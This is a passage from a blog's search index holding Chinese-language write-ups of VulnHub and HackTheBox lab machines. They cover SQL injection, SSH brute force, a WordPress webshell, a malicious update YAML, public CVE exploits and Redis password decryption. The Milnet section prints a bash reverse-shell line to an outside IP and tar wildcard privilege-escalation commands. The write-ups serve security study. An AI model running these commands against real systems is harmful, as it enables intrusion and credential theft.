src=\"/vulnhub_img/WEBRESOURCE800c57352f8b65ac29a8c70bb6fab2c2%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e然后访问即可：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE5bc826032ea059785650a96a8e9d39a3%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003ch1 id=\"提权\"\u003e提权：\u003c/h1\u003e\n\u003cp\u003e提权使用常规思维又是卡了很久，但是卡住的时候往往答案很简单，信息检索就行，使用linpeas.sh并没有帮我提取出来需要的内容，只能手动查找：\u003c/p\u003e\n\u003cp\u003e查找pass关键词i文件：\u003c/p\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003egrep -R -i pass /home/* 2\u0026gt;/dev/null\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE8f0d9c340eb525a5eae98c55dbcb9595%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE97ef93e48505336d9b2f2ddb5176020b%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e没有flag\u003c/p\u003e\n\u003ch1 id=\"总结\"\u003e总结\u003c/h1\u003e\n\u003cp\u003e感觉是有点体力活儿的意思，不太好搞\u003c/p\u003e","title":"0x030 LampSecurity CTF5"},{"content":"坏了，又不能自动获取IP地址，然后看了一下随靶机附带的文件，密码还是错的\n只能进centos6的单用户模式进去修改配置文件了：https://blog.csdn.net/qq_40576436/article/details/125164748\nDHCP半天获取不到，索性直接配置静态了，配置文件如下，复制了lo环回口的配置文件，修改了一些：\n端口扫描 渗透 ssh和smb暂时没有发现东西，看来突破口应该是在80，901，8080，10000这几个HTTP端口：\n说实话这台靶机有运气的成分在里面，web扫描都没用，因为是抽时间做的，\n首先是注册框存在sql注入：\n然后我就直接上sqlmap跑了一下数据库，但是存在一个问题，这地方是注册的地方，导致数据库内容插入了很多脏东西，后面我就换了一个地方注入：\n然后这个地方我试了几个ID，其中就有3，这里是个提示，说brian是专家，后面就用上了：\n随后我继续注入，dump了所有用户，下面一坨就是注入加入的用户，删掉：\n把hash解密一下：\n做成账号密码本，进行ssh爆破：\n这里爆破了一堆账号：\n提权 我随机登录了一个账号，看了一下sudo权限，然后看了一下家目录，确实是这么多用户，而且其中大部分是有密码的：\n这个时候我想起来了先前sql注入的地方的ID，说brian是专家，有没有可能brian的权限会高一些，随后我就切换到brian去了：\n总结 后面看了一下红笔视频\n","permalink":"https://yangzhuzai.github.io/posts/vulnhub/0x031-lampsecurity-ctf7/","summary":"\u003cp\u003e坏了，又不能自动获取IP地址，然后看了一下随靶机附带的文件，密码还是错的\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE166850e169c593dffba25e28fa031cc4%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e只能进centos6的单用户模式进去修改配置文件了：\u003ca href=\"https://blog.csdn.net/qq_40576436/article/details/125164748\"\u003ehttps://blog.csdn.net/qq_40576436/article/details/125164748\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003eDHCP半天获取不到，索性直接配置静态了，配置文件如下，复制了lo环回口的配置文件，修改了一些：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEef61dfc71754f421d1e825906c0eb630%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003ch1 id=\"端口扫描\"\u003e端口扫描\u003c/h1\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE20d083d70777bce78b8fa53c62f8d20e%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003ch1 id=\"渗透\"\u003e渗透\u003c/h1\u003e\n\u003cp\u003essh和smb暂时没有发现东西，看来突破口应该是在80，901，8080，10000这几个HTTP端口：\u003c/p\u003e\n\u003cp\u003e说实话这台靶机有运气的成分在里面，web扫描都没用，因为是抽时间做的，\u003c/p\u003e\n\u003cp\u003e首先是注册框存在sql注入：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEd6a086820bb2c996b4473638eaec971f%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e然后我就直接上sqlmap跑了一下数据库，但是存在一个问题，这地方是注册的地方，导致数据库内容插入了很多脏东西，后面我就换了一个地方注入：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEde63507c30ac9a453b4f101506bed750%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e然后这个地方我试了几个ID，其中就有3，这里是个提示，说brian是专家，后面就用上了：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEdd4431984a0afcb6db355a604fb70a73%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e随后我继续注入，dump了所有用户，下面一坨就是注入加入的用户，删掉：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE584c80a55c2955aa02b585cd4b541504%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e把hash解密一下：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE1df040a8d2101ce4c83677a9b260638b%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e做成账号密码本，进行ssh爆破：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEfc0db90b0b07cbd1b9e2574d5dd73c22%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e这里爆破了一堆账号：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEde5c2a4465dc9247b1a33092ca8934db%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003ch1 id=\"提权\"\u003e提权\u003c/h1\u003e\n\u003cp\u003e我随机登录了一个账号，看了一下sudo权限，然后看了一下家目录，确实是这么多用户，而且其中大部分是有密码的：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE5733097a4a04d7b501d8755edb9b3742%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e这个时候我想起来了先前sql注入的地方的ID，说brian是专家，有没有可能brian的权限会高一些，随后我就切换到brian去了：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE7e60ab52d4fd0000b3a713fad9c8c100%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003ch1 id=\"总结\"\u003e总结\u003c/h1\u003e\n\u003cp\u003e后面看了一下红笔视频\u003c/p\u003e","title":"0x031 LampSecurity CTF7"},{"content":"端口扫描 获取立足点 单从靶机的端口开放情况来看，只有80端口开放，web渗透获取立足点，或者有knockd？但是这不是linux，暂且看看吧，没有什么头绪，不是现场的框架，也没有其他端口开放，同时没有其他目录和域名，后面看了一下WP。\nwindows 主题 themes\n是有个win11的主题漏洞，研究一下怎么打吧：\ngit clone https://github.com/Jnnshschl/CVE-2023-38146.git\npython3 -m pip install -r requirements.txt\nsudo apt-get install g++-mingw-w64-x86-64\n运行：\n这里的IP和端口都是本地IP端口：\n开启监听：\n上传：\n可能要多尝试几次：\n后台应该是个计划任务，对于这些非服务端的攻击，其实真的很难有现成的复现资料：\n提权 那个ps1脚本看起来就是触发脚本，然后那个pdf的内容是再提示漏洞：\n去github找现成的：\nhttps://github.com/duck-sec/CVE-2023-28252-Compiled-exe\n使用msf生成一个木马，然后nc监听即可：\n.\\exploit.exe 1208 1 cxk.exe，比较简单\n","permalink":"https://yangzhuzai.github.io/posts/htb/0x032-aero/","summary":"\u003ch1 id=\"端口扫描\"\u003e端口扫描\u003c/h1\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCE3750b7f1fc2738082cd7871831d3edafimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCEe0654ee3d610ebcd14d3a5ba9650ae07image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCEb6abefba514da9dd59d306ff8a843ea3image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003ch1 id=\"获取立足点\"\u003e获取立足点\u003c/h1\u003e\n\u003cp\u003e单从靶机的端口开放情况来看，只有80端口开放，web渗透获取立足点，或者有knockd？但是这不是linux，暂且看看吧，没有什么头绪，不是现场的框架，也没有其他端口开放，同时没有其他目录和域名，后面看了一下WP。\u003c/p\u003e\n\u003cp\u003ewindows 主题 themes\u003c/p\u003e\n\u003cp\u003e是有个win11的主题漏洞，研究一下怎么打吧：\u003c/p\u003e\n\u003cp\u003egit clone \u003ca href=\"https://github.com/Jnnshschl/CVE-2023-38146.git\"\u003ehttps://github.com/Jnnshschl/CVE-2023-38146.git\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCE773a351fb7a3fcdd79d4258fc2f1cbf6image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003epython3 -m pip install -r requirements.txt\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCEa8ce4703d341cf4a2f7355c08ecd11beimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003esudo apt-get install g++-mingw-w64-x86-64\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCE8288500b6dee031de9e04ba372635e58image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e运行：\u003c/p\u003e\n\u003cp\u003e这里的IP和端口都是本地IP端口：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCE789bb20b3b5d29bddb3ead726e61bd48image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e开启监听：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCEd7cd34b427d7310495d28128b404d9efimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e上传：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCE19a69ea993df83c9cc54837c7de94b52image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e可能要多尝试几次：\u003c/p\u003e\n\u003cp\u003e后台应该是个计划任务，对于这些非服务端的攻击，其实真的很难有现成的复现资料：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCEd6acd0c9b9b41a2e0eb889042889301aimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003ch1 id=\"提权\"\u003e提权\u003c/h1\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCE07735a3a4c81bcac2a8ec7b984f40cd0image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e那个ps1脚本看起来就是触发脚本，然后那个pdf的内容是再提示漏洞：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCEb172412664b5050414524af622297decimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e去github找现成的：\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"https://github.com/duck-sec/CVE-2023-28252-Compiled-exe\"\u003ehttps://github.com/duck-sec/CVE-2023-28252-Compiled-exe\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCEc39591775bad6a6622f9ab5b84a67f52image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e使用msf生成一个木马，然后nc监听即可：\u003c/p\u003e\n\u003cp\u003e.\\exploit.exe 1208 1 cxk.exe，比较简单\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCEbf99bb16e37461ce4aa58db5e114830aimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e","title":"0X032 Aero"},{"content":"这个靶机的网络环境建议直接使用自带的NAT，折腾了一会儿桥接，算了\n端口扫描 渗透 大概看了一下开放端口和脚本扫描情况，大部分是常规端口，比较让人在意的是6667端口的irc服务，非常规服务，搜索了一下如何利用：\n试了几个payload都不行：\nsmb:\n挂载到本地慢慢看：\n疑似可用信息：\nmysql passwd:\nadmin\nTogieMYSQL12345^^\n但是不让连：\n那就web渗透吧：\nwp疑似用户名？\nwpscan扫一下：\n两个用户名没有插件：\n用刚刚收集的密码试了一下，果然，毕竟靶机名字叫lazysysadmin\n后台getsghell：\nhttp://192.168.1.138/wordpress/wp-content/themes/twentyfifteen/404.php\n提权 额，早该想到的，lazysysadmin\n果然懒啊，sudo权限这样给：\n","permalink":"https://yangzhuzai.github.io/posts/vulnhub/0x032-lazysysadmin/","summary":"\u003cp\u003e这个靶机的网络环境建议直接使用自带的NAT，折腾了一会儿桥接，算了\u003c/p\u003e\n\u003ch1 id=\"端口扫描\"\u003e端口扫描\u003c/h1\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE72d08c1b1b33442a24aefef7e2dd85e2%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE913fadb661d1be6ad997f2b8d151d3fd%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEce67c11b54ab1775c3260d79679abae9%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE1b7c82ea0bef70c52d8f88983586720d%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003ch1 id=\"渗透\"\u003e渗透\u003c/h1\u003e\n\u003cp\u003e大概看了一下开放端口和脚本扫描情况，大部分是常规端口，比较让人在意的是6667端口的irc服务，非常规服务，搜索了一下如何利用：\u003c/p\u003e\n\u003cp\u003e试了几个payload都不行：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE648c582fd1610675ca160aeca15f5046%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003esmb:\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE5348002957b2fe8528d516f5d6f5bd4c%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e挂载到本地慢慢看：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE3d4c787b2b3d27b9471048a0a7995ef4%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e疑似可用信息：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE5387be05bf182af18b80f053abc6a20c%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE5c390678d56ad9bb45609de099ca2ae2%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEc1a4aa7ddae6bb4905197064fa054fe4%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003emysql passwd:\u003c/p\u003e\n\u003cp\u003eadmin\u003c/p\u003e\n\u003cp\u003eTogieMYSQL12345^^\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE3cb813f0b54a85fa2d08ea6896737f55%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e但是不让连：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEf3dc66aee2cd2605d826cde9cddbbf1e%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e那就web渗透吧：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE99bcc89ff554b4ba8f30a175111e1016%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003ewp疑似用户名？\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEc7e55b84059143f8886483c6a8a61144%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003ewpscan扫一下：\u003c/p\u003e\n\u003cp\u003e两个用户名没有插件：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEf4a5cce86e62459ed90cbb1e111868d7%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e用刚刚收集的密码试了一下，果然，毕竟靶机名字叫lazysysadmin\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEc03b87b06cb11c44d26db41edc00afd9%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e后台getsghell：\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"http://192.168.1.138/wordpress/wp-content/themes/twentyfifteen/404.php\"\u003ehttp://192.168.1.138/wordpress/wp-content/themes/twentyfifteen/404.php\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEa206dfd6e8a9dc0d5803560d01bd0047%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003ch1 id=\"提权\"\u003e提权\u003c/h1\u003e\n\u003cp\u003e额，早该想到的，lazysysadmin\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE3049624f0d62c6b7e14d39312d167d3b%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEbb5af2dc8c822faf67f910aa63b5bba2%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e果然懒啊，sudo权限这样给：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE81f08b76f4f9d223db807d8d1270b253%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e","title":"0x032 lazysysadmin"},{"content":"端口扫描 获取立足点 从端口开放情况来看，值得关注的点有：smb、redis、5985、80、443\n先看smb:\n这里的内容，似乎在说，把程序放在这个目录，会自动运行：\n创建者Pages\n看看redis呢：\n好像不行，没有未授权：\nweb方面，443和80页面一样：\n发现文件，下载：\nsmb确实有写入权限：\n程序看起来没有什么特别的，逆向看看把：\n好像没逆向出来，有点尴尬：\n抓包看看了：\n发现dns查询，添加hosts抓取tun0：\n然后大概了解一下，程序通过访问目标上的yml文件，然后根据yml文件的内容，来尝试更新软件，然后结合刚刚PDF的内容，我们可以上传一个yml文件，指向我们的exe程序，就可以尝试getshell了：\n计算一下值：\nsha512sum \u0026ldquo;8'889.exe\u0026rdquo; | cut -d \u0026rsquo; \u0026rsquo; -f1 | xxd -r -p | base64 -w0\njJ7y5xvMF62HF3VmIQOFMpTogFyyYLl04zditACTK5L0j9CMQRHaC7OuI0mWeRI09tE0zOMTKienCmBNJqn+fA==\nyml文件内容如下：\nversion: 1.0.1\rfiles:\r- url: 8\u0026#39;889.exe\rsha512: jJ7y5xvMF62HF3VmIQOFMpTogFyyYLl04zditACTK5L0j9CMQRHaC7OuI0mWeRI09tE0zOMTKienCmBNJqn+fA==\rsize: 73802\rpath: 8\u0026#39;889.exe\rsha512: jJ7y5xvMF62HF3VmIQOFMpTogFyyYLl04zditACTK5L0j9CMQRHaC7OuI0mWeRI09tE0zOMTKienCmBNJqn+fA== 上传上去：\n运行程序，稍等一会儿：\n提权 看起来不像是很容易提权的样子：\nwinpess也没有什么有效的内容：\n只能接着信息收集了：\n读取redis密码：\n可以登录：\n发现密码，这是https://www.exploit-db.com/exploits/49409进行解密：\nkidvscat_admin_@123\n\u0026gt;\u0026gt;\u0026gt; import base64\r\u0026gt;\u0026gt;\u0026gt; from des import *\r\u0026gt;\u0026gt;\u0026gt; hash = base64.b64decode(\u0026#39;Odh7N3L9aVQ8/srdZgG2hIR0SSJoJKGi\u0026#39;.encode(\u0026#39;utf-8\u0026#39;))\r\u0026gt;\u0026gt;\u0026gt; key = DesKey(b\u0026#34;7ly6UznJ\u0026#34;)\r\u0026gt;\u0026gt;\u0026gt; print(key.decrypt(hash,initial=b\u0026#34;XuVUm5fR\u0026#34;,padding=True).decode(\u0026#39;utf-8\u0026#39;))\rkidvscat_admin_@123 ","permalink":"https://yangzhuzai.github.io/posts/htb/0x033-atom/","summary":"\u003ch1 id=\"端口扫描\"\u003e端口扫描\u003c/h1\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCE8b12b40668a685aaf03708f82a1327faimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCE838d3d2c7c7be70a575948e081b49644image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCEf47224e81e57676fb1dc66b138668843image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003ch1 id=\"获取立足点\"\u003e获取立足点\u003c/h1\u003e\n\u003cp\u003e从端口开放情况来看，值得关注的点有：smb、redis、5985、80、443\u003c/p\u003e\n\u003cp\u003e先看smb:\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCEf0126d08eed606a7b2849f6baa4b2eb1image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e这里的内容，似乎在说，把程序放在这个目录，会自动运行：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCE83261bfc23c13a3b3e76b0efea015b67image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e创建者Pages\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCEa81fdd7469055ca0d7cfaa9467a380b7image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e看看redis呢：\u003c/p\u003e\n\u003cp\u003e好像不行，没有未授权：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCE8fc7da8c0119ea9131f9d3f0407ce0cfimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003eweb方面，443和80页面一样：\u003c/p\u003e\n\u003cp\u003e发现文件，下载：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCE4dda52a834bc2cb9dab0160b6a02b2b1image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003esmb确实有写入权限：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCE7924124077b02f05625e98a0b4b4984bimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e程序看起来没有什么特别的，逆向看看把：\u003c/p\u003e\n\u003cp\u003e好像没逆向出来，有点尴尬：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCE489df158a57e08c89bb85f55c6b06d6bimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e抓包看看了：\u003c/p\u003e\n\u003cp\u003e发现dns查询，添加hosts抓取tun0：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCE06ea8bc4271baa0819b7b662b66ad474image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e然后大概了解一下，程序通过访问目标上的yml文件，然后根据yml文件的内容，来尝试更新软件，然后结合刚刚PDF的内容，我们可以上传一个yml文件，指向我们的exe程序，就可以尝试getshell了：\u003c/p\u003e\n\u003cp\u003e计算一下值：\u003c/p\u003e\n\u003cp\u003esha512sum \u0026ldquo;8'889.exe\u0026rdquo; | cut -d \u0026rsquo; \u0026rsquo; -f1 | xxd -r -p | base64 -w0\u003c/p\u003e\n\u003cp\u003ejJ7y5xvMF62HF3VmIQOFMpTogFyyYLl04zditACTK5L0j9CMQRHaC7OuI0mWeRI09tE0zOMTKienCmBNJqn+fA==\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCEc521913fef8b1266a49fa85f4714dfd3image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003eyml文件内容如下：\u003c/p\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003eversion: 1.0.1\r\nfiles:\r\n - url: 8\u0026#39;889.exe\r\n   sha512: jJ7y5xvMF62HF3VmIQOFMpTogFyyYLl04zditACTK5L0j9CMQRHaC7OuI0mWeRI09tE0zOMTKienCmBNJqn+fA==\r\n   size: 73802\r\npath: 8\u0026#39;889.exe\r\nsha512: jJ7y5xvMF62HF3VmIQOFMpTogFyyYLl04zditACTK5L0j9CMQRHaC7OuI0mWeRI09tE0zOMTKienCmBNJqn+fA==\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e上传上去：\u003c/p\u003e","title":"0X033 Atom"},{"content":"这台靶机的网络很棒，能桥接，还能自动告诉咋们IP地址\n端口扫描 渗透 就两个端口，直接看80呗：\n抓包看了一下数据包，发现确实存在远程文件包含：\n弹shell吧，这里看报错就可以知道，应该是逻辑处理的地方添加了php后缀：\n提权 查了一些资料，关于tar通配符提权：\nhttps://www.cnblogs.com/jhinjax/p/17067082.html\n第一次尝试失败了，我猜测是下面这个红框里面的原因，没有引号，中间有空格，让人操蛋的是，这玩意儿删不掉：\n重置了一下机器，然后这次我加上了引号就可以了\necho \u0026#34;bash -c \u0026#39;bash -i \u0026gt;\u0026amp; /dev/tcp/192.168.5.66/8899 0\u0026gt;\u0026amp;1\u0026#39;\u0026#34;\u0026gt;1.sh\rtouch \u0026#34;/var/www/html/--checkpoint-action=exec=\u0026#39;sh 1.sh\u0026#39;\u0026#34;\rtouch \u0026#34;/var/www/html/--checkpoint=1\u0026#34; ","permalink":"https://yangzhuzai.github.io/posts/vulnhub/0x033-milnet/","summary":"\u003cp\u003e这台靶机的网络很棒，能桥接，还能自动告诉咋们IP地址\u003c/p\u003e\n\u003ch1 id=\"端口扫描\"\u003e端口扫描\u003c/h1\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEa3613cd58e1766b1f64062b552945d74%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE13482f9d87fa08afddc390f6189f74b4%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEf10e92bf472185f88c8e89af154e1b0e%e6%88%aa%e5%9b%be.png\" alt=\"\"  